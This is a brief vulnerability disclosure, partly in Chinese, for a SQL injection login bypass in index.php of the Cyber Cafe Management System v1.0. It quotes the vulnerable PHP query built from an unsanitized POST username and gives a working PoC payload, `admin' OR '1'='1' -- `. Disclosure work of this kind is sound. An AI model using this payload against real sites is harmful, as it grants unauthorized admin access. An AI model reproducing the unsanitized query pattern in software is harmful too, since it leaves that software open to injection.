# SQLi vulnerability in Cyber Cafe Management System Project v1.0 of file index.php

**vender**:

[PHP Project, PHP Projects Ideas, PHP Latest tutorials, PHP oops Concept](https://phpgurukul.com/)

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**SoftLink**:

[Cyber Cafe Management System Using PHP & MySQL , Cyber Cafe Management System Project](https://phpgurukul.com/cyber-cafe-management-system-using-php-mysql/)

**Vulnerable File**

- index.php

**Version**

- V1.0

### Analyse

`ccms\index.php:8-10` - 登录绕过SQLi

index.php:8-10

```
$adminuser=$_POST['username'];
$password=md5($_POST['password']);
$query=mysqli_query($con,"select ID from tbladmin where  UserName='$adminuser' && Password='$password' ");
```

- **参数**: `username` (POST)
- **危害**: 认证绕过，可直接登录管理后台
- **PoC**: `admin' OR '1'='1' -- `

![image-20251212112806285](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121128459.png)



![image-20251212112816794](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202512121128934.png)